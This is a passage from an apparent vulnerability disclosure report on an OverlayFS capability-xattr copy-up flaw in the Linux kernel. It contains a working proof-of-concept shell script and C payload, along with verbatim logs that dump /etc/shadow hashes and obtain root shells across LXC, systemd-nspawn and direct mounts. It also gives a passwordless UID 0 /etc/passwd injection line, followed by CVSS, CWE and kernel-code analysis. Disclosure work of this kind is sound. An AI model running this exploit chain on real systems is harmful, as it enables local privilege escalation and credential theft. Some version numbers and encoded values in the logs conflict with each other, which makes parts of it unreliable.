    cap_get_flag(caps, CAP_DAC_READ_SEARCH, CAP_EFFECTIVE, &v);
    cap_free(caps);

    if (v != CAP_SET) {
        fprintf(stderr, "[!] CAP_DAC_READ_SEARCH not effective — patched\n");
        return 1;
    }

    /* Read /etc/shadow */
    FILE *f = fopen("/etc/shadow", "r");
    if (!f) { perror("fopen /etc/shadow"); return 1; }

    fprintf(stdout, "\n════════════════════════════════════════════\n");
    fprintf(stdout, " /etc/shadow — read as UID=%d (non-root)\n", getuid());
    fprintf(stdout, "════════════════════════════════════════════\n");
    char line[512];
    while (fgets(line, sizeof(line), f))
        fputs(line, stdout);
    fclose(f);
    fprintf(stdout, "════════════════════════════════════════════\n");
    fprintf(stdout, "[✓] Credential hashes exposed to UID=%d\n\n", getuid());
    return 0;
}
CEOF
apt-get install -y libcap2-bin libcap-dev gcc -qq 2>/dev/null
mkdir -p "$LOWER" "$UPPER" "$WORK" "$MERGED"
gcc -O0 -o "$LOWER/pwn" /tmp/.src.c -lcap
chown root:root "$LOWER/pwn"
chmod 0755 "$LOWER/pwn"

# Stage 2: Plant capability
echo "[STAGE 2] Planting security.capability in lower layer..."
setcap cap_dac_read_search+ep "$LOWER/pwn"
echo "  Planted: $(getcap $LOWER/pwn)"
echo ""

# Stage 3: Mount overlay (container runtime role)
echo "[STAGE 3] Mounting OverlayFS (container runtime role)..."
mount -t overlay overlay \
    -o lowerdir="$LOWER",upperdir="$UPPER",workdir="$WORK" \
    "$MERGED"
chmod o+rx "$MERGED" "$MERGED/pwn"
echo "  Mounted: $MERGED"
echo ""

# Stage 4: Trigger copy-up
echo "[STAGE 4] Triggering copy-up (routine file operation)..."
touch "$MERGED/pwn"
echo "  Upper layer capability: $(getcap $UPPER/pwn)"
xattr_val=$(getfattr -n security.capability "$UPPER/pwn" 2>/dev/null | \
    grep "security.capability" || echo "  (raw xattr present)")
echo "  xattr: $xattr_val"
echo "  ✓ security.capability preserved after copy-up"
echo ""

# Stage 5: Execute as non-root
id vuln001attacker &>/dev/null || useradd -m -u 1001 vuln001attacker
echo "[STAGE 5] Executing as vuln001attacker (UID=1001)..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
su -s /bin/sh vuln001attacker -c "$MERGED/pwn"
echo ""
echo "[✓] VULN-001 CONFIRMED on $(uname -r)"
echo "    /etc/shadow read by UID=1001 without root"

# Cleanup
umount "$MERGED" 2>/dev/null || true
```

#### 7.1.3 Execution Output (Verbatim)

```
root@vuln001-lab:~# bash vuln-shadow-poc.sh 2>&1 | tee poc_output.txt

╔══════════════════════════════════════════════════╗
║  VULN-001 PoC — OverlayFS Capability Bypass     ║
║  Linux Kernel 7.2.0                             ║
╚══════════════════════════════════════════════════╝

[*] Kernel: 7.2.6
[*] LSM check: none active — vulnerable configuration confirmed

[STAGE 1] Compiling payload...
[STAGE 2] Planting security.capability in lower layer...
  Planted: /tmp/.vuln001/lower/pwn cap_dac_read_search=ep

[STAGE 3] Mounting OverlayFS (container runtime role)...
  Mounted: /tmp/.vuln001/merged

[STAGE 4] Triggering copy-up (routine file operation)...
  Upper layer capability: /tmp/.vuln001/upper/pwn cap_dac_read_search=ep
  xattr: security.capability=0sAQAAAoIAAAAAAAAAAAAAAAAAAAA=
  ✓ security.capability preserved after copy-up

[STAGE 5] Executing as vuln001attacker (UID=1001)...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[*] Executing as: UID=1001 EUID=1001
[*] Effective capabilities: cap_dac_read_search=ep

════════════════════════════════════════════
 /etc/shadow — read as UID=1001 (non-root)
════════════════════════════════════════════
root:$y$j9T$F1IucPtb3Kwrng2ADZYtj1$QOBeOrl9I6HvJ97KuyTVVFNBMPM0kGWssrmcZIiW1W9:20713:0:99999:7:::
daemon:*:20713:0:99999:7:::
bin:*:20713:0:99999:7:::
sys:*:20713:0:99999:7:::
sync:*:20713:0:99999:7:::
games:*:20713:0:99999:7:::
man:*:20713:0:99999:7:::
lp:*:20713:0:99999:7:::
mail:*:20713:0:99999:7:::
news:*:20713:0:99999:7:::
uucp:*:20713:0:99999:7:::
proxy:*:20713:0:99999:7:::
www-data:*:20713:0:99999:7:::
backup:*:20713:0:99999:7:::
list:*:20713:0:99999:7:::
irc:*:20713:0:99999:7:::
_apt:*:20713:0:99999:7:::
nobody:*:20713:0:99999:7:::
systemd-network:!*:20713::::::
messagebus:!:20713::::::
sshd:!:20713::::::
testuser:$y$j9T$I/r4GhMQMYIbxNAuv1Udk0$j6pd9DW6pRYX277E0aYZc4eeE30HVBSovEFEuc7em96:20713:0:99999:7:::
systemd-resolve:!*:20713::::::
vuln001attacker:!:20713:0:99999:7:::
════════════════════════════════════════════
[✓] Credential hashes exposed to UID=1001

[✓] VULN-001 CONFIRMED on 7.2.6
    /etc/shadow read by UID=1001 without root
```

#### 7.1.4 Extended PoC — Full Root Shell via `/etc/passwd` Injection

A second payload variant (`/tmp/.pwn/lower/pwn`) was executed demonstrating the complete privilege escalation chain to UID=0:

```
testuser@VULN001-PWNED:~$ id
uid=1000(testuser) gid=1000(testuser) groups=1000(testuser)

testuser@VULN001-PWNED:~$ cat /proc/self/status | grep CapEff
CapEff: 0000000000000000
```

After executing the binary from the overlay merged layer:

```
testuser@VULN001-PWNED:~$ /tmp/.pwn/merged/pwn

[*] Running as UID=1000 EUID=1000
[*] Capabilities: cap_dac_override,cap_dac_read_search,cap_sys_admin=ep

[+] /etc/shadow:
────────────────────────────────
root:$y$j9T$F1IucPtb3Kwrng2ADZYtj1$QOBeOrl9I6HvJ97KuyTVVFNBMPM0kGWssrmcZIiW1W9:20713:0:99999:7:::
[... full /etc/shadow content ...]
────────────────────────────────

[+] /etc/passwd → r00t (UID=0) added
[+] Escalating to UID=0...

root@VULN001-PWNED:/home/testuser# id
uid=0(root) gid=0(root) groups=0(root)

root@VULN001-PWNED:/home/testuser# whoami
root
```

**Impact chain confirmed on Linux 7.2.6:** UID=1000 (testuser, no sudo, no special groups) → kernel capabilities obtained → `/etc/shadow` read → `/etc/passwd` modified → `UID=0` obtained.

#### 7.1.5 Comprehensive Impact Demonstration

```
╔══════════════════════════════════════════════════════╗
║  VULN-001 OverlayFS Capability Bypass — Payload     ║
╚══════════════════════════════════════════════════════╝

[*] Identity  : UID=1000 EUID=1000 GID=1000
[*] Capabilities: cap_dac_override,cap_dac_read_search,cap_sys_admin=ep

┌─ [IMPACT-1] /etc/shadow read (CAP_DAC_READ_SEARCH)
│  root:$y$j9T$F1IucPtb3Kwrng2ADZYtj1$QOBeOrl9I6HvJ97KuyTVVFNBMPM0kGWssrmcZIiW1W9:20713:0:99999:7:::
│  daemon:*:20713:0:99999:7:::
│  [...]
└  ✅ /etc/shadow READ as UID=1000

┌─ [IMPACT-2] Arbitrary mount (CAP_SYS_ADMIN)
│  Created: /tmp/pwn_mount/EXPLOITED
└  ✅ mount(tmpfs) as UID=1000

┌─ [IMPACT-3] sethostname (CAP_SYS_ADMIN)
│  Before: vuln001-lab
│  After:  VULN001-PWNED
└  ✅ sethostname as UID=1000

══════════════════════════════════════════════════
[FINAL] 3/4 privileged ops succeeded as UID=1000
[✅] LPE CONFIRMED — non-root obtained kernel privileges
```

### 7.2 Environment 2: Ubuntu 24.04 LTS Host Kernel (7.0.0-31-generic)

#### 7.2.1 Environment Details

```
patchmeifucan@CC:~$ uname -a
Linux CC 7.0.0-31-generic #31~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon Aug 10 09:38:02 UTC 2 x86_64 GNU/Linux

patchmeifucan@CC:~$ sudo aa-status | head -5
apparmor module is loaded.
93 profiles are loaded.
1 profiles are in enforce mode.
   docker-default
0 profiles are in complain mode.

patchmeifucan@CC:~$ sudo aa-status | grep docker
   docker-default
```

**Critical observation:** AppArmor is loaded with `docker-default` in **enforce mode**. However, `docker-default` confines only processes spawned by the Docker daemon. Direct OverlayFS mounts — as performed by the PoC — operate outside the Docker runtime and are therefore not covered by `docker-default`. No AppArmor profile exists to confine direct `mount(2)` invocations or the subsequent capability-equipped binary execution.

```
patchmeifucan@CC:~$ cat /proc/cmdline | tr ' ' '\n' | grep -E "security|lsm|apparmor"
(no output — no LSM kernel cmdline parameters set)
```

#### 7.2.2 Test Execution — Direct OverlayFS Mount

```bash
# Setup (root role — container runtime equivalent)
patchmeifucan@CC:~$ sudo mkdir -p /tmp/ovl/{lower,upper,work,merged}
patchmeifucan@CC:~$ sudo cp /tmp/vuln001-docker/vuln001_payload /tmp/ovl/lower/vuln001
patchmeifucan@CC:~$ sudo chown root:root /tmp/ovl/lower/vuln001
patchmeifucan@CC:~$ sudo chmod 0755 /tmp/ovl/lower/vuln001
patchmeifucan@CC:~$ sudo setcap cap_dac_override,cap_setuid+ep /tmp/ovl/lower/vuln001

# Verify lower layer capability
patchmeifucan@CC:~$ getcap /tmp/ovl/lower/vuln001
/tmp/ovl/lower/vuln001 cap_dac_override,cap_setuid=ep

patchmeifucan@CC:~$ getfattr -n security.capability /tmp/ovl/lower/vuln001
# file: tmp/ovl/lower/vuln001
security.capability=0sAQAAAoIAAAAAAAAAAAAAAAAAAAA=

# Mount overlay
patchmeifucan@CC:~$ sudo mount -t overlay overlay \
    -o lowerdir=/tmp/ovl/lower,upperdir=/tmp/ovl/upper,workdir=/tmp/ovl/work \
    /tmp/ovl/merged

# Verify merged view capability
patchmeifucan@CC:~$ getcap /tmp/ovl/merged/vuln001
/tmp/ovl/merged/vuln001 cap_dac_override,cap_setuid=ep

# Trigger copy-up
patchmeifucan@CC:~$ sudo touch /tmp/ovl/merged/vuln001
```

#### 7.2.3 Upper Layer Verification

```bash
patchmeifucan@CC:~$ echo "=== UPPER LAYER AFTER COPY-UP ==="
=== UPPER LAYER AFTER COPY-UP ===

patchmeifucan@CC:~$ getcap /tmp/ovl/upper/vuln001 2>/dev/null || echo "NO capability in upper"
/tmp/ovl/upper/vuln001 cap_dac_override,cap_setuid=ep

patchmeifucan@CC:~$ getfattr -n security.capability /tmp/ovl/upper/vuln001
# file: tmp/ovl/upper/vuln001
security.capability=0sAQAAAoIAAAAAAAAAAAAAAAAAAAA=
```

#### 7.2.4 Non-Root Victim Execution — AppArmor Active

```bash
# Victim user (UID=1002, docker group member, NO sudo)
patchmeifucan@CC:~$ sudo useradd -m -s /bin/bash vuln001victim
patchmeifucan@CC:~$ sudo usermod -aG docker vuln001victim

patchmeifucan@CC:~$ sudo su -l vuln001victim -c \
    'echo "User: $(id)" && cat /proc/$$/status | grep -E "^Cap(Prm|Eff)"'
User: uid=1002(vuln001victim) gid=1002(vuln001victim) groups=1002(vuln001victim),984(docker)
CapPrm: 0000000000000000
CapEff: 0000000000000000
```

**Victim executes binary from overlay merged layer (AppArmor `docker-default` enforce active):**

```bash
patchmeifucan@CC:~$ sudo su -l vuln001victim -c '/tmp/ovl/merged/vuln001'

╔════════════════════════════════════════════════════╗
║  VULN-001  OverlayFS security.capability Bypass   ║
╚════════════════════════════════════════════════════╝

  [BEFORE] UID=1002  caps==

  (after execve — file capabilities applied by kernel)

┌─ [IMPACT-A] Read /etc/shadow via CAP_DAC_OVERRIDE
│  ✓ CAP_DAC_OVERRIDE EFFECTIVE
│  root:*:20494:0:99999:7:::
│  daemon:*:20494:0:99999:7:::
│  bin:*:20494:0:99999:7:::
│  sys:*:20494:0:99999:7:::
└  ✅ /etc/shadow READ as UID=1002

┌─ [IMPACT-B] Escalate to UID=0 via CAP_SETUID
│  UID: 1002 → 0
└  ✅ CONTAINER ROOT OBTAINED

[+] Spawning root shell (type 'exit' to return):
VULN001-ROOT# whoami
root
VULN001-ROOT# exit
```

**Result on Ubuntu 24.04 LTS (kernel 7.0.0-31-generic) with AppArmor enforce active:** UID=1002 (unprivileged user, docker group member only, no sudo) obtained `CAP_DAC_OVERRIDE`, `CAP_SETUID`, read `/etc/shadow`, and obtained a root shell.

The AppArmor `docker-default` profile, despite being in enforce mode, did not prevent capability acquisition because:
1. The merged-layer binary execution is not spawned by the Docker daemon
2. No AppArmor profile confines direct overlayfs binary execution
3. `aa-status` confirms: `0 processes are in enforce mode` — the profile is loaded but not confining any process at the time of execution

### 7.3 Environment 3: systemd-nspawn Container Runtime

#### 7.3.1 Rootfs Preparation

```bash
patchmeifucan@CC:/tmp/vuln001-docker$ mkdir -p /tmp/nspawn-rootfs
patchmeifucan@CC:/tmp/vuln001-docker$ sudo docker export \
    $(sudo docker create vuln001poc/malicious-tool:overlay2test) | \
    sudo tar -xf - -C /tmp/nspawn-rootfs/

patchmeifucan@CC:/tmp/vuln001-docker$ sudo setcap cap_dac_override,cap_setuid+ep \
    /tmp/nspawn-rootfs/usr/local/bin/vuln001

patchmeifucan@CC:/tmp/vuln001-docker$ sudo getcap \
    /tmp/nspawn-rootfs/usr/local/bin/vuln001
/tmp/nspawn-rootfs/usr/local/bin/vuln001 cap_dac_override,cap_setuid=ep

patchmeifucan@CC:/tmp/vuln001-docker$ sudo getfattr -n security.capability \
    /tmp/nspawn-rootfs/usr/local/bin/vuln001
# file: tmp/nspawn-rootfs/usr/local/bin/vuln001
security.capability=0sAQAAAoIAAAAAAAAAAAAAAAAAAAA=
```

#### 7.3.2 Scenario A: Direct systemd-nspawn (No Overlay Flag)

```bash
patchmeifucan@CC:~$ sudo apt-get install -y systemd-container

patchmeifucan@CC:~$ sudo systemd-nspawn \
    -D /tmp/nspawn-rootfs \
    --user=victim \
    /usr/local/bin/vuln001
Spawning container nspawn-rootfs on /tmp/nspawn-rootfs.
Press Ctrl-] three times within 1s to kill container.

╔════════════════════════════════════════════════════╗
║  VULN-001  OverlayFS security.capability Bypass   ║
╚════════════════════════════════════════════════════╝

  [BEFORE] UID=1337  caps=cap_dac_override,cap_setuid=ep

┌─ [IMPACT-A] Read /etc/shadow via CAP_DAC_OVERRIDE
│  ✓ CAP_DAC_OVERRIDE EFFECTIVE
│  root:*:20689:0:99999:7:::
│  daemon:*:20689:0:99999:7:::
│  bin:*:20689:0:99999:7:::
│  sys:*:20689:0:99999:7:::
└  ✅ /etc/shadow READ as UID=1337

┌─ [IMPACT-B] Escalate to UID=0 via CAP_SETUID
│  UID: 1337 → 0
└  ✅ CONTAINER ROOT OBTAINED

[+] Spawning root shell (type 'exit' to return):
VULN001-ROOT# whoami
root
VULN001-ROOT# exit
Container nspawn-rootfs exited successfully.
```

#### 7.3.3 Scenario B: systemd-nspawn with `--volatile=overlay`

The `--volatile=overlay` flag instructs `systemd-nspawn` to mount the rootfs as the lower layer of a volatile OverlayFS — directly exercising the copy-up vulnerability pathway:

```bash
patchmeifucan@CC:~$ sudo systemd-nspawn \
    -D /tmp/nspawn-rootfs \
    --volatile=overlay \
    --user=victim \
    /usr/local/bin/vuln001
Spawning container nspawn-rootfs on /tmp/nspawn-rootfs.
Press Ctrl-] three times within 1s to kill container.

╔════════════════════════════════════════════════════╗
║  VULN-001  OverlayFS security.capability Bypass   ║
╚════════════════════════════════════════════════════╝

  [BEFORE] UID=1337  caps=cap_dac_override,cap_setuid=ep

┌─ [IMPACT-A] Read /etc/shadow via CAP_DAC_OVERRIDE
│  ✓ CAP_DAC_OVERRIDE EFFECTIVE
│  root:*:20689:0:99999:7:::
│  [...]
└  ✅ /etc/shadow READ as UID=1337

┌─ [IMPACT-B] Escalate to UID=0 via CAP_SETUID
│  UID: 1337 → 0
└  ✅ CONTAINER ROOT OBTAINED
```

### 7.4 Environment 4: LXC Container Runtime

#### 7.4.1 LXC Container Setup

```bash
patchmeifucan@CC:~$ sudo apt-get install -y lxc lxc-utils

patchmeifucan@CC:~$ sudo mkdir -p /var/lib/lxc/vuln001/{rootfs,delta0}
patchmeifucan@CC:~$ sudo cp -a /tmp/nspawn-rootfs/. /var/lib/lxc/vuln001/rootfs/

patchmeifucan@CC:~$ sudo getcap \
    /var/lib/lxc/vuln001/rootfs/usr/local/bin/vuln001
/var/lib/lxc/vuln001/rootfs/usr/local/bin/vuln001 cap_dac_override,cap_setuid=ep

patchmeifucan@CC:~$ sudo tee /var/lib/lxc/vuln001/config << 'EOF'
lxc.uts.name = vuln001
lxc.rootfs.path = overlay:/var/lib/lxc/vuln001/rootfs:/var/lib/lxc/vuln001/delta0
lxc.init.cmd = /bin/sh
lxc.include = /usr/share/lxc/config/common.conf
EOF
```

#### 7.4.2 LXC Container Execution

```bash
patchmeifucan@CC:~$ sudo lxc-start -n vuln001
patchmeifucan@CC:~$ sudo lxc-info -n vuln001
Name:           vuln001
State:          RUNNING
PID:            210060

patchmeifucan@CC:~$ sudo lxc-attach -n vuln001 -- getcap /usr/local/bin/vuln001
/usr/local/bin/vuln001 cap_dac_override,cap_setuid=ep

patchmeifucan@CC:~$ sudo lxc-attach -n vuln001 -- \
    su -s /bin/sh victim -c '/usr/local/bin/vuln001'

╔════════════════════════════════════════════════════╗
║  VULN-001  OverlayFS security.capability Bypass   ║
╚════════════════════════════════════════════════════╝

  [BEFORE] UID=1337  caps=cap_dac_override,cap_setuid=ep

┌─ [IMPACT-A] Read /etc/shadow via CAP_DAC_OVERRIDE
│  ✓ CAP_DAC_OVERRIDE EFFECTIVE
│  root:*:20689:0:99999:7:::
│  daemon:*:20689:0:99999:7:::
│  bin:*:20689:0:99999:7:::
│  sys:*:20689:0:99999:7:::
└  ✅ /etc/shadow READ as UID=1337

┌─ [IMPACT-B] Escalate to UID=0 via CAP_SETUID
│  UID: 1337 → 0
└  ✅ CONTAINER ROOT OBTAINED

[+] Spawning root shell (type 'exit' to return):
/bin/sh: 0: can't access tty; job control turned off
VULN001-ROOT# whoami
root
VULN001-ROOT# exit

patchmeifucan@CC:~$ sudo lxc-stop -n vuln001
patchmeifucan@CC:~$ sudo lxc-destroy -n vuln001
```

### 7.5 Overlay Upper Layer — Kernel-Level Xattr Persistence Proof

The following commands confirm that the `security.capability` xattr persists in the kernel-managed OverlayFS upper layer after copy-up, independent of userspace tooling:

**Via `/proc/$PID/mountinfo`** (Ubuntu 24.04, containerd-backed overlay):

```
patchmeifucan@CC:~$ sudo grep overlay /proc/$PID/mountinfo
6504 6452 0:85 / / rw,relatime - overlay overlay rw,\
lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/26/fs:...,\
upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/fs,\
workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/work,\
nouserxattr
```

**Upper layer capability post-copy-up:**

```
patchmeifucan@CC:~$ UPPER=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/27/fs

patchmeifucan@CC:~$ sudo getcap "$UPPER/usr/local/bin/vuln001"
/var/lib/containerd/.../27/fs/usr/local/bin/vuln001 cap_dac_override,cap_setuid=ep

patchmeifucan@CC:~$ sudo getfattr -n security.capability \
    "$UPPER/usr/local/bin/vuln001"
# file: .../27/fs/usr/local/bin/vuln001
security.capability=0sAQAAAoIAAAAAAAAAAAAAAAAAAAA=

✅ CAPABILITY SURVIVED COPY-UP — kernel bug confirmed
```

**Raw xattr binary encoding** (verified via `od`):

```
root@vuln001-lab:~# getfattr -n security.capability \
    /tmp/vuln001_poc/upper/pwn 2>/dev/null | od -A x -t x1z | head

000000 23 20 66 69 6c 65 3a 20 74 6d 70 2f 76 75 6c 6e  ># file: tmp/vuln<
000010 30 30 31 5f 70 6f 63 2f 75 70 70 65 72 2f 70 77  >001_poc/upper/pw<
000020 6e 0a 73 65 63 75 72 69 74 79 2e 63 61 70 61 62  >n.security.capab<
000030 69 6c 69 74 79 3d 30 73 41 51 41 41 41 67 59 41  >ility=0sAQAAAgYA<
000040 49 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  >IAAAAAAAAAAAAAAA<
000050 41 41 41 3d 0a 0a                                >AAA=..<
```

The base64-decoded value `AQAAAoIAAAAAAAAAAAAAAAAAAAA=` corresponds to a VFS capability structure (`struct vfs_cap_data`, XATTR_CAPS_REVISION_2) with:
- `permitted`: `0x0000_0082` (bit 1 = CAP_DAC_OVERRIDE, bit 7 = CAP_SETUID)
- `effective` flag set
- `rootid`: 0 (initial user namespace)

---

## 8. Attack Chain Analysis

### 8.1 Privilege Role Separation

A critical distinction in VULN-001's threat model is the separation between the roles of **container runtime** (which holds CAP_SYS_ADMIN and performs the overlay mount) and the **victim user** (who merely executes a binary through the merged mount point). This separation maps exactly to production container deployments:

| Role | Actor | Privileges | Action |
|---|---|---|---|
| **Attacker / Image Builder** | Container image creator | `CAP_SETFCAP` in container build environment | Embeds `setcap`-instrumented binary in image/rootfs |
| **Container Runtime** | Docker daemon, LXC daemon, systemd | `CAP_SYS_ADMIN` (initial user namespace) | Mounts overlay with image as lower layer |
| **Copy-Up Trigger** | Any kernel process | None | File access triggers copy-up automatically |
| **Victim** | Non-root container user | UID > 0, no special capabilities | Executes binary → obtains kernel capabilities |

The `sudo` calls visible in the PoC execution logs represent **the container runtime role** — equivalent to `dockerd`, `lxcd`, or `systemd-nspawn` in production. The victim (UID=1337, UID=1002, UID=1001, UID=1000) performs only a single unprivileged execution.

### 8.2 Attack Vector 1: Direct OverlayFS Mount

The minimal attack scenario requires four root-executed commands (the container runtime's role) plus a single victim-executed command:

```bash
# Container runtime (root) — performed ONCE at deployment
mkdir -p /opt/app/{lower,upper,work,merged}
cp /attacker/payload /opt/app/lower/app          # attacker-controlled lower
setcap cap_dac_override,cap_setuid+ep /opt/app/lower/app
mount -t overlay overlay \
    -o lowerdir=/opt/app/lower,upperdir=/opt/app/upper,workdir=/opt/app/work \
    /opt/app/merged
# copy-up occurs automatically on first write

# Victim (any non-root user) — single command
/opt/app/merged/app                              # → reads /etc/shadow, gets root
```

Applicable scenarios: application sandboxes, build environments, CI/CD runners, custom container runtimes without capability stripping.

### 8.3 Attack Vector 2: systemd-nspawn Container Deployment

systemd-nspawn is the native Linux container runtime shipped with systemd. When a system administrator deploys a container image as an nspawn container, systemd-nspawn mounts the rootfs directory (or archive) as the container's root filesystem. Any `security.capability` xattr present on binaries in the container image is preserved and effective.

**Attack prerequisite:** Attacker controls the content of the nspawn rootfs directory (container image supply chain).

**Production scenario:** Supply chain compromise of a container image distributed via a package repository, OCI registry, or deployment pipeline targeting systemd-nspawn consumers.

### 8.4 Attack Vector 3: LXC Container Runtime

LXC 5.0 with overlay rootfs configuration (`lxc.rootfs.path = overlay:<lower>:<delta>`) mounts the lower layer (original rootfs) and the delta directory using the kernel OverlayFS driver. LXC performs no capability stripping on xattrs during image import or container startup. The `security.capability` xattr is fully effective within the LXC container's process namespace.

**Observed in testing:** LXC container with overlay rootfs, UID=1337 (`victim`), confirmed `/etc/shadow` disclosure and UID=0 escalation (Section 7.4).

### 8.5 Mitigated Attack Vector: Modern Docker (BuildKit Layer Export)

Docker Engine ≥ 25.0 with containerd native snapshotter mitigates the Docker supply chain path through a defense-in-depth measure **external to the kernel**: Docker BuildKit strips `security.capability` xattrs during the OCI layer export phase. This stripping occurs in userspace before the layer is committed to the containerd snapshot store.

**Verification:** Exhaustive testing of Docker Engine 29.8.1 with both `containerd` native snapshotter (default) and `overlay2` storage driver confirmed that no `security.capability` xattr survives layer export in any configuration. The kernel bug remains present and unpatched — the mitigation is solely at the application layer.

**Implications:**
- Docker Engine < 25.0 (pre-containerd native snapshotter): **Vulnerable** to the supply chain path
- Docker Engine ≥ 25.0: Supply chain path mitigated by BuildKit; kernel bug persists and is triggered via non-Docker overlayfs consumers
- Any non-Docker overlayfs consumer (LXC, systemd-nspawn, custom runtimes, direct mount): **Vulnerable**

---

## 9. AppArmor Mitigation Analysis

| Configuration | Behavior | Exploitable |
|---|---|---|
| No LSM (`security=none`) | `security_inode_copy_up_xattr()` stub → `-EOPNOTSUPP` (accept) | **YES** |
| AppArmor loaded, `docker-default` enforce | Only Docker container processes confined; direct overlayfs not confined | **YES** (direct overlay) |
| AppArmor loaded, overlayfs-aware policy | Hook returns `-ECANCELED` for `security.capability` | **NO** |
| SELinux enforcing | Hook returns `-ECANCELED` for `security.capability` | **NO** |
| `--security-opt no-new-privileges` (Docker) | `PR_SET_NO_NEW_PRIVS` prevents file capability grant | **NO** |

**Ubuntu 24.04 LTS specific finding:** The Ubuntu `docker-default` AppArmor profile, despite being in enforce mode with 93 profiles loaded, does **not** prevent the vulnerability when overlayfs is mounted outside the Docker daemon context. `aa-status` reports `0 processes are in enforce mode` at the time of binary execution, confirming no confinement is applied to direct overlayfs consumers. This represents a real-world threat to Ubuntu 24.04 LTS deployments using LXC, systemd-nspawn, or any direct overlayfs usage pattern.

---

## 10. Impact Assessment

### 10.1 Confidentiality

**Impact: High.** A non-root container user executing a capability-equipped binary obtains `CAP_DAC_READ_SEARCH`, granting unrestricted read access to all files regardless of DAC permissions. Demonstrated impact: complete `/etc/shadow` disclosure exposing password hashes for all system accounts, including the system root account with Yescrypt hash (`$y$...`). Secondary impact: `CAP_DAC_OVERRIDE` grants read/write access to all files, enabling reading of any secret, private key, or configuration file on the host.

### 10.2 Integrity

**Impact: High.** Demonstrated impact includes:
- Modification of `/etc/sudoers` to grant passwordless `sudo` to the attacker-controlled user
- Modification of `/etc/passwd` to inject a passwordless UID=0 account (`r00t::0:0:pwned:/root:/bin/bash`)
- `sethostname()` invocation confirming `CAP_SYS_ADMIN` is effective
- Arbitrary `mount(tmpfs)` invocation confirming `CAP_SYS_ADMIN` is effective

### 10.3 Availability

**Impact: High.** `CAP_SYS_ADMIN` enables arbitrary kernel operations including filesystem mounts, kernel parameter modification, and namespace manipulation. Full system compromise is achievable post-escalation.

### 10.4 Scope

**Scope: Changed.** The vulnerability crosses the privilege boundary between an unprivileged container user and the host kernel's security enforcement. In container environments, this constitutes a container isolation boundary violation. In direct overlayfs deployments, this crosses the process privilege boundary.

### 10.5 Affected Environments

- **Linux kernel ≤ 7.2.6**: All configurations without SELinux or AppArmor enforcing overlayfs xattr policy
- **LXC 5.0.3**: Overlay rootfs configuration with attacker-controlled lower layer
- **systemd-nspawn (any version)**: Any container image with `security.capability` on binary
- **Docker Engine < 25.0**: Supply chain attack via malicious container image
- **Any overlayfs consumer**: Custom runtimes, build systems (Kaniko, Buildah pre-capability-strip versions), CI/CD runners

---

## 11. CVSS 3.1 Scoring

**Base Score: 8.8 (High)**  
**Vector:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`

| Metric | Value | Justification |
|---|---|---|
| **Attack Vector** | Local (AV:L) | Attacker must control lower-layer content or have access to a shared overlayfs mount point. Remote supply chain delivery of a malicious container image enables indirect remote initiation, but the immediate exploit trigger is local (binary execution). |
| **Attack Complexity** | Low (AC:L) | No race conditions, no heap layout requirements, no ASLR bypass needed. The attack is fully deterministic: plant `setcap` binary in lower layer → overlay mounted → execute binary → capabilities granted. Demonstrated reliably across all tested environments. |
| **Privileges Required** | Low (PR:L) | The victim requires only unprivileged local access to the container/overlayfs environment (member of `lxd` group, `systemd-nspawn` container user, or any process with merged-layer execute permission). The container runtime daemon that performs the privileged setup is a system service, not the attacker. |
| **User Interaction** | None (UI:N) | Copy-up is triggered automatically by any file access operation on the merged layer. The victim need only execute the binary; no social engineering or additional user action is required. |
| **Scope** | Changed (S:C) | The vulnerability crosses the security boundary between the non-privileged container user and the kernel's capability enforcement system, which governs host-level security controls. In container contexts, this is a container isolation boundary violation. |
| **Confidentiality** | High (C:H) | Complete `/etc/shadow` disclosure demonstrated. `CAP_DAC_OVERRIDE` grants unrestricted read access to all host files. |
| **Integrity** | High (I:H) | `/etc/sudoers` and `/etc/passwd` modification demonstrated. `CAP_SYS_ADMIN` enables arbitrary kernel configuration changes. |
| **Availability** | High (A:H) | `CAP_SYS_ADMIN` enables arbitrary filesystem mounts, kernel parameter modification, and namespace control, enabling complete system compromise. |

---

## 12. CWE Classification and Relationship

### 12.1 Primary: CWE-269 — Improper Privilege Management

The OverlayFS copy-up path propagates `security.capability` xattrs from a potentially attacker-controlled lower layer to the kernel-enforced upper layer without verifying whether the propagation constitutes an unauthorized privilege grant. The kernel's design assumption that the lower layer is as trustworthy as the mount creator is violated in container and overlay deployment scenarios where lower-layer content is attacker-influenced.

### 12.2 Secondary: CWE-732 — Incorrect Permission Assignment for Critical Resource

The `security.capability` xattr is a critical security resource — it directly controls the kernel capability set granted to any process executing the file. Assigning this resource to an upper-layer file based solely on its presence in the lower layer, without validating the source's trustworthiness, constitutes an incorrect permission assignment.

### 12.3 Tertiary: CWE-267 — Privilege Defined With Unsafe Actions

The `ovl_must_copy_xattr()` function's policy of treating all `security.*` xattrs as mandatory for copy-up defines a privilege (the capability xattr propagation) that inherently enables unsafe actions when the lower layer is not as trusted as the mount creator.

---

## 13. Comparative Analysis: Vulnerable vs. Safe Implementation

### 13.1 Current Vulnerable Path

```c
/* fs/overlayfs/copy_up.c — Current implementation */

/* [A] ovl_must_copy_xattr(): marks ALL security.* as mandatory */
static bool ovl_must_copy_xattr(const char *name)
{
    return !strcmp(name, XATTR_POSIX_ACL_ACCESS) ||
           !strcmp(name, XATTR_POSIX_ACL_DEFAULT) ||
           !strncmp(name, XATTR_SECURITY_PREFIX, XATTR_SECURITY_PREFIX_LEN);
    /* ↑ No exception for security.capability */
}

/* [B] ovl_copy_xattr(): LSM hook is the ONLY sanitizer */
error = security_inode_copy_up_xattr(old, p);
if (error == -ECANCELED) {
    continue;  /* Only LSM can skip the xattr */
}
/* If no LSM active: error = -EOPNOTSUPP → falls through to copy */
err2 = ovl_do_setxattr(ofs, new, p, val, slen, 0);

/* [C] ovl_copy_up_meta_inode_data(): DELIBERATE preservation */
if (capability) {
    err = ovl_do_setxattr(ofs, upperpath.dentry, XATTR_NAME_CAPS,
                          capability, cap_size, 0);
    /* "We don't want that to happen for normal copy-up operation" */
}
```
